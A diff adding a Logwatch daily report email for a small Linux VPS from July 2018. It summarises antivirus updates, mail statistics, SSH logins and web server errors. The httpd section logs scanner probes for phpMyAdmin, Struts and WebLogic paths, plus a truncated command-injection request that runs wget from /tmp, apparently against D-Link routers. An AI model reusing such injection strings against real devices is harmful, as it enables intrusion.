@@ -1,0 +1,222 @@
+Return-Path: <root@hrankiety.pl>
+Delivered-To: postmaster@hrankiety.pl
+Received: by hrankiety.pl (Postfix, from userid 0)
+	id 162C89F201D2; Mon, 30 Jul 2018 03:24:14 +0200 (CEST)
+To: postmaster@hrankiety.pl
+From: postmaster@hrankiety.pl
+Subject: Logwatch for 2626.serwervps.pl (Linux)
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset="iso-8859-1"
+Message-Id: <20180730012414.162C89F201D2@hrankiety.pl>
+Date: Mon, 30 Jul 2018 03:24:10 +0200 (CEST)
+
+
+ ################### Logwatch 7.3.6 (05/19/07) #################### 
+        Processing Initiated: Mon Jul 30 03:24:09 2018
+        Date Range Processed: yesterday
+                              ( 2018-Jul-29 )
+                              Period is day.
+      Detail Level of Output: 0
+              Type of Output: unformatted
+           Logfiles for Host: 2626.serwervps.pl
+  ################################################################## 
+ 
+ --------------------- clam-update Begin ------------------------ 
+
+ Last ClamAV update process started at Sun Jul 29 03:18:17 2018
+ 
+ Last Status:
+    WARNING: Your ClamAV installation is OUTDATED!
+    WARNING: Local version: 0.100.0 Recommended version: 0.100.1
+    DON'T PANIC! Read https://www.clamav.net/documents/upgrading-clamav
+    main.cvd is up to date (version: 58, sigs: 4566249, f-level: 60, builder: sigmgr)
+    Downloading daily-24790.cdiff [100%]
+    Downloading daily-24791.cdiff [100%]
+    Downloading daily-24792.cdiff [100%]
+    daily.cld updated (version: 24792, sigs: 2029502, f-level: 63, builder: neo)
+    bytecode.cld is up to date (version: 326, sigs: 93, f-level: 63, builder: neo)
+    [LibClamAV] Detected duplicate databases /var/lib/clamav/main.cvd and /var/lib/clamav/main.cld, please manually remove one of them
+    Database updated (6595844 signatures) from db.local.clamav.net (IP: 104.16.187.138)
+ 
+ ---------------------- clam-update End ------------------------- 
+
+ 
+ --------------------- Clamav Begin ------------------------ 
+
+ 
+ **Unmatched Entries**
+ Received 0 file descriptor(s) from systemd.
+ Not loading PUA signatures.
+ Only loading official signatures.
+ Bytecode: Security mode set to "TrustSigned".
+ LOCAL: Unix socket file /tmp/clamd.socket
+ LOCAL: Setting connection queue length to 30
+ Limits: Global size limit set to 104857600 bytes.
+ Limits: File size limit set to 26214400 bytes.
+ Limits: Recursion level limit set to 16.
+ Limits: Files limit set to 10000.
+ Limits: MaxEmbeddedPE limit set to 10485760 bytes.
+ Limits: MaxHTMLNormalize limit set to 10485760 bytes.
+ Limits: MaxHTMLNoTags limit set to 2097152 bytes.
+ Limits: MaxScriptNormalize limit set to 5242880 bytes.
+ Limits: MaxZipTypeRcg limit set to 1048576 bytes.
+ Limits: MaxPartitions limit set to 50.
+ Limits: MaxIconsPE limit set to 100.
+ Limits: MaxRecHWP3 limit set to 16.
+ Limits: PCREMatchLimit limit set to 100000.
+ Limits: PCRERecMatchLimit limit set to 5000.
+ Limits: PCREMaxFileSize limit set to 26214400.
+ BlockMax heuristic detection disabled.
+ 
+ ---------------------- Clamav End ------------------------- 
+
+ 
+ --------------------- httpd Begin ------------------------ 
+
+ 
+ Connection attempts using mod_proxy:
+    171.13.14.30 -> 133.130.126.119:43: 1 Time(s)
+ 
+ Requests with error response codes
+    400 Bad Request
+       /: 1 Time(s)
+       /login.cgi?cli=aa%20aa%27;cd%20/tmp;wget%2 ... %20dlink%20%27$: 2 Time(s)
+       /x: 1 Time(s)
+    404 Not Found
+       /MyAdmin/scripts/setup.php: 2 Time(s)
+       /PMA2/index.php: 1 Time(s)
+       /admin/PMA/index.php: 1 Time(s)
+       /admin/index.php: 1 Time(s)
+       /admin/mysql/index.php: 1 Time(s)
+       /admin/mysql2/index.php: 1 Time(s)
+       /admin/phpMyAdmin/index.php: 1 Time(s)
+       /admin/phpmyadmin/index.php: 1 Time(s)
+       /admin/phpmyadmin2/index.php: 1 Time(s)
+       /admin/pma/index.php: 1 Time(s)
+       /claroline/phpMyAdmin/index.php: 1 Time(s)
+       /db/index.php: 1 Time(s)
+       /dbadmin/index.php: 1 Time(s)
+       /index.action: 1 Time(s)
+       /index.do: 1 Time(s)
+       /index.php: 1 Time(s)
+       /myadmin/index.php: 1 Time(s)
+       /myadmin/scripts/setup.php: 2 Time(s)
+       /myadmin2/index.php: 1 Time(s)
+       /mysql-admin/index.php: 1 Time(s)
+       /mysqladmin/index.php: 1 Time(s)
+       /phpMyAdmin.old/index.php: 1 Time(s)
+       /phpMyAdmin/index.php: 1 Time(s)
+       /phpMyAdmin/phpMyAdmin/index.php: 1 Time(s)
+       /phpMyAdmin/scripts/setup.php: 2 Time(s)
+       /phpMyAdminold/index.php: 1 Time(s)
+       /phpMyadmin_bak/index.php: 1 Time(s)
+       /phpadmin/index.php: 1 Time(s)
+       /phpma/index.php: 1 Time(s)
+       /phpmyadmin-old/index.php: 1 Time(s)
+       /phpmyadmin/index.php: 1 Time(s)
+       /phpmyadmin/phpmyadmin/index.php: 1 Time(s)
+       /phpmyadmin/scripts/setup.php: 2 Time(s)
+       /phpmyadmin1/index.php: 1 Time(s)
+       /phpmyadmin2/index.php: 1 Time(s)
+       /pma-old/index.php: 1 Time(s)
+       /pma/index.php: 1 Time(s)
+       /pma/scripts/setup.php: 2 Time(s)
+       /pmamy2/index.php: 1 Time(s)
+       /struts2-rest-showcase/orders.xhtml: 1 Time(s)
+       /tools/phpMyAdmin/index.php: 1 Time(s)
+       /w00tw00t.at.blackhats.romanian.anti-sec:): 2 Time(s)
+       /web/phpMyAdmin/index.php: 1 Time(s)
+       /wls-wsat/CoordinatorPortType: 1 Time(s)
+       /xampp/phpmyadmin/index.php: 1 Time(s)
+       /xmlrpc.php: 2 Time(s)
+    405 Method Not Allowed
+       /: 1 Time(s)
+       133.130.126.119:43: 1 Time(s)
+ 
+ ---------------------- httpd End ------------------------- 
+
+ 
+ --------------------- pam_unix Begin ------------------------ 
+
+ su:
+    Sessions Opened:
+       btertil -> root: 1 Time(s)
+ 
+ 
+ ---------------------- pam_unix End ------------------------- 
+
+ 
+ --------------------- Postfix Begin ------------------------ 
+
+       52   *Warning: Pre-queue content-filter connection overload 
+     6952   SASL authentication failed 
+       25   Miscellaneous warnings 
+ 
+  393.350K  Bytes accepted                           402,790
+  384.771K  Bytes delivered                          394,006
+ ========   ================================================
+ 
+       15   Accepted                                 100.00%
+ --------   ------------------------------------------------
+       15   Total                                    100.00%
+ ========   ================================================
+ 
+     7010   Connections made      
+     7010   Disconnections        
+       15   Removed from queue    
+       11   Delivered             
+        4   Bounce (remote)       
+        2   DSNs undeliverable    
+ 
+        1   Timeout (inbound)     
+        1   SMTP protocol violations 
+ 
+ 
+ 
+ ---------------------- Postfix End ------------------------- 
+
+ 
+ --------------------- SSHD Begin ------------------------ 
+
+ 
+ Users logging in through sshd:
+    btertil:
+       185.17.41.230 (backup): 2 times
+       89.73.82.159 (89-73-82-159.dynamic.chello.pl): 1 time
+ 
+ 
+ Received disconnect:
+    11: disconnected by user : 2 Time(s)
+ 
+ ---------------------- SSHD End ------------------------- 
+
+ 
+ --------------------- yum Begin ------------------------ 
+
+ 
+ Packages Installed:
+    fail2ban-0.8.8-2.el6.noarch
+ 
+ Packages Updated:
+    clamav-0.100.1-1.el6.i686
+    clamav-db-0.100.1-1.el6.i686
+    fail2ban-0.9.6-1.el6.1.noarch
+    clamd-0.100.1-1.el6.i686
+ 
+ ---------------------- yum End ------------------------- 
+
+ 
+ --------------------- Disk Space Begin ------------------------ 
+
+ Filesystem      Size  Used Avail Use% Mounted on
+ /dev/simfs       50G   23G   28G  46% /
+ none            512M  4.0K  512M   1% /dev
+ 
+ 
+ ---------------------- Disk Space End ------------------------- 
+
+ 
+ ###################### Logwatch End ######################### 
+
+ 
